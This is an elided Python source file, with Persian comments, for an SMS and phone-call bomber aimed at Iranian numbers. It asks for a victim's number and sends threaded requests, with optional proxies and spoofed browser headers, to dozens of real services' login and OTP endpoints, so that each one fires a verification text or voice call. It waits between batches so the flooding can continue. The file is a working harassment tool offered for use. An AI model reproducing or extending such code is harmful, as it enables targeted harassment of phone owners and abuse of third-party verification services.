...
class Handler:
    ...
    def send_sms(self, num: str, proxies: Optional[dict] = None):
        threads = [
            Thread(target=self.launcher, args=(func, num, proxies)) for func in self.sms
        ]
    ...
    def send_call(self, num: str, proxies: Optional[dict] = None):
        threads = [
            Thread(target=self.launcher, args=(func, num, proxies))
    ...
    def launcher(self, func: callable, num: str, proxies: Union[dict, None]):
        ...
        try:
            ...
            print(
                f"{Col.green}[+]{Fore.LIGHTMAGENTA_EX} Sent {func.__name__} {sent} sended"
            )
            counter += 1
            sent += 1
            if sent >= count:
...
def start(
    choice_str: str, number: str, spam_count: int = 10, proxies: Optional[dict] = None
):
    global sent
    if proxy_state():
    ...
    print(
        f"{Col.yellow}[!]{Col.green} Started sending {choice_str} with {Fore.LIGHTCYAN_EX}{len(api_list)}{Col.green} APIs"
    )
        ...
        if sent < spam_count:  # فقط اگر هنوز اسپم بیشتر داریم
            ...
            def wait_timer(seconds=150):
                ...
                while True:
                    ...
                    sys.stdout.write(
                        f"\r[!] توقف بین batch ها: {percent}% - زمان باقی‌مانده: {remaining:.0f}s "
                    )
                    sys.stdout.flush()
                    time.sleep(0.5)
...
if __name__ == "__main__":
    ...
    try:
        ...
        print(
            f"{Col.yellow}[!]{Col.gray} Proxies are {'Enabled' if proxy_state() else 'Disabled'}"
        )
        ...
        number = get_input(
            f"{Fore.CYAN}[=]{Col.gray} Enter the phone number [9xxxxxxxxx]: {Col.green}",
    ...
    def setup_api():
        ...
        def drnext(num, proxies):
            post(
                ...
                json={"source": "besina", "mobile": f"0{num}"},
            )
        ...
        def bit24(num, proxies):
            post(
                ...
                json={"mobile": f"0{num}", "contry_code": "98"},
            )
        ...
        def drto(num, proxies):
            get(
                ...
                json={"mobile": num, "captcha": "", "country_id": 205},
            )
        ...
        def shahriariran(num, proxies):
            post(
                proxies=proxies,
                url="https://panel.shahriareiran.com/api/v2/auth/request",
                json={"phone": f"0{num}"},
            )
        ...
        def fidibo(num, proxies):
            post(
                "https://fidibo.com/user/login-by-sms",
        ...
        def shad(num, proxies):
            ...
            shadD = {
                "api_version": "3",
                "method": "sendCode",
                "data": {"phone_number": "098" + num, "send_type": "SMS"},
            }
            post(
                proxies=proxies,
        ...
        def digify(num, proxies):
            n4 = {
                ...
                "variables": {"content": {"phone_number": "0" + num}},
        ...
        def okcs(num, proxies):
            ...
            get(
                proxies=proxies,
                url="https://okcs.com/users/mobilelogin?mobile=0" + num,
                headers=rhead,
            )
        ...
        def snappdoctor(num, proxies):
            rhead = {"user-agent": generate_user_agent()}
            get(
                f"https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{num}/sms?cCode=+98",
                headers=rhead,
                timeout=5,
            )
        ...
        def tagmond(num, proxies):
            ...
            post(
                ...
                data="utf8=%E2%9C%93&phone_number="
                + "0"
                + num
        ...
        def behzadshami(num, proxies):
            ...
            rhead = {
                ...
                "user-agent": generate_user_agent(os="android"),
                "sec-ch-ua-platform": '"Android"',
                "origin": "https://behzadshami.com",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://behzadshami.com/my-account/",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7",
        ...
        def pubgsell(num, proxies):
            ...
            post(
                proxies=proxies,
                url=f"https://pubg-sell.ir/loginuser?username=0{num}",
                headers=rhead,
            )
        ...
        def ashrafi(num, proxies):
            ...
            rhead = {
                ...
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "cookie": "digits_countrycode=98",
                "origin": "https://ashraafi.com",
                "referer": "https://ashraafi.com/login-register/",
        ...
        def bandarazad(num, proxies):
            ...
            rhead = {
                ...
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "cookie": "digits_countrycode=98",
                "origin": "https://bandarazad.com",
                "referer": "https://bandarazad.com/?login=true&page=1&redirect_to=https%3A%2F%2Fbandarazad.com%2F",
                "sec-ch-ua": '"Google Chrome";v="105"'
                ', "Not)A;Brand";v="8", "Chromium";v="105"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "Windows",
        ...
        def bazidone(num, proxies):
            ...
            rhead = {
                ...
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "cookie": "digits_countrycode=98",
                "origin": "https://bazidone.com",
                "referer": "https://bazidone.com/?login=true&page=1&redirect_to=https%3A%2F%2Fbazidone.com%2F",
                "sec-ch-ua": '"Google Chrome";v="105"'
                ', "Not)A;Brand";v="8", "Chromium";v="105"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "Windows",
        ...
        def bigtoys(num, proxies):
            ...
            rhead = {
                ...
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "cookie": "digits_countrycode=98",
                "origin": "https://www.bigtoys.ir",
                "referer": "https://www.bigtoys.ir/?login=true&back=home&page=1",
                "sec-ch-ua": '"Google Chrome";v="105"'
                ', "Not)A;Brand";v="8", "Chromium";v="105"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "Windows",
        ...
        def bitex24(num, proxies):
            HEADER = {
                ...
                "accept-language": "en-US,en;q=0.9",
                "lang": "null",
                "origin": "https://admin.bitex24.com",
                "referer": "https://admin.bitex24.com/",
                "sec-ch-ua": '"Google Chrome";v="105"'
                ', "Not)A;Brand";v="8", "Chromium";v="105"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "Windows",
            ...
            get(
                proxies=proxies,
                url=f"https://bitex24.com/api/v1/auth/sendSms?mobile=0{num}&dial_code=0",
                headers=HEADER,
            )
        ...
        def candoosms(num, proxies):
            ...
            rhead = {
                ...
                "content-length": "33",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://www.candoosms.com",
                "referer": "https://www.candoosms.com/signup/",
                "sec-ch-ua": '"Google Chrome";v="105"'
                ', "Not)A;Brand";v="8", "Chromium";v="105"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "Windows",
        ...
        def farsgraphic(num, proxies):
            ...
            rhead = {
                ...
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "cookie": "digits_countrycode=98",
                "origin": "https://farsgraphic.com",
                "referer": "https://farsgraphic.com/?login=true&page=1&redirect_to=https%3A%2F%2Ffarsgraphic.com%2F",
                "sec-ch-ua": '"Google Chrome";v="105"'
                ', "Not)A;Brand";v="8", "Chromium";v="105"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "Windows",
        ...
        def glite(num, proxies):
            ...
            rhead = {
                ...
                "content-length": "37",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://www.glite.ir",
                "referer": "https://www.glite.ir/user-login/",
                "sec-ch-ua": '"Google Chrome";v="105"'
                ', "Not)A;Brand";v="8", "Chromium";v="105"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "Windows",
        ...
        def hemat(num, proxies):
            ...
            rhead = {
                ...
                "content-length": "307",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://shop.hemat-elec.ir",
                "referer": "https://shop.hemat-elec.ir/?login=true&page=1&redirect_to=https%3A%2F%2Fshop.hemat-elec.ir%2F",
                "sec-ch-ua": '"Google Chrome";v="105"'
                ', "Not)A;Brand";v="8", "Chromium";v="105"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "Windows",
        ...
        def kodakamoz(num, proxies):
            ...
            rhead = {
                ...
                "content-length": "554",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://www.kodakamoz.com",
                "referer": "https://www.kodakamoz.com/?login=true&page=1&redirect_to=https%3A%2F%2Fwww.kodakamoz.com%2F",
                "sec-ch-ua": '"Google Chrome";v="105"'
                ', "Not)A;Brand";v="8", "Chromium";v="105"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "Windows",
        ...
        def mipersia(num, proxies):
            ...
            rhead = {
                ...
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "cookie": "digits_countrycode=98",
                "origin": "https://www.mipersia.com",
                "referer": "https://www.mipersia.com/?login=true&page=1&redirect_to=https%3A%2F%2Fwww.mipersia.com%2F",
                "sec-ch-ua": '"Google Chrome";v="105"'
                ', "Not)A;Brand";v="8", "Chromium";v="105"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "Windows",
        ...
        def sabziman(num, proxies):
            ...
            rhead = {
                ...
                "referer": "https://sabziman.com/%D8%B3%D9%88%D8%A7%D9%84%D8%A7%D8%AA-%D9%85%D8%AA%D8%AF%D8%A7%D9%88%D9%84/",
                "sec-ch-ua": '"Google Chrome";v="105"'
                ', "Not)A;Brand";v="8", "Chromium";v="105"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "Windows",
        ...
        def tajtehran(num, proxies):
            ...
            rhead = {
                ...
                "content-length": "37",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://tajtehran.com",
                "referer": "https://tajtehran.com/",
                "sec-ch-ua": '"Google Chrome";v="105"'
                ', "Not)A;Brand";v="8", "Chromium";v="105"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "Windows",
        ...
        def mrbilitcall(num, proxies):
            get(
                proxies=proxies,
                url=f"https://auth.mrbilit.com/api/Token/send/byCall?mobile=0{num}",
            )
        ...
        def tezolmarket(num, proxies):
            ...
            get(
                "https://www.tezolmarket.com/Account/Login",
        ...
        def gap(num, proxies):
            get(
                proxies=proxies,
                url=f"https://core.gap.im/v1/user/resendCode.json?mobile=%2B98{num}&type=IVR",
            )
        ...
        def azki(num, proxies):
            get(
                proxies=proxies,
                url=f"https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=0{num}",
                headers={
                    "accept": "*/*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "en-US,en;q=0.9",
        ...
        def trip(num, proxies):
            ...
            post(
                ...
                headers=rhead,
                json={"CellPhone": "0" + num},
            )
            post(
                proxies=proxies,
                url="https://gateway.trip.ir/api/Totp",
                headers=rhead,
                json={"PhoneNumber": "0" + num},
            )
    ...
    setup_api()  # حالا همه APIها ثبت شدند
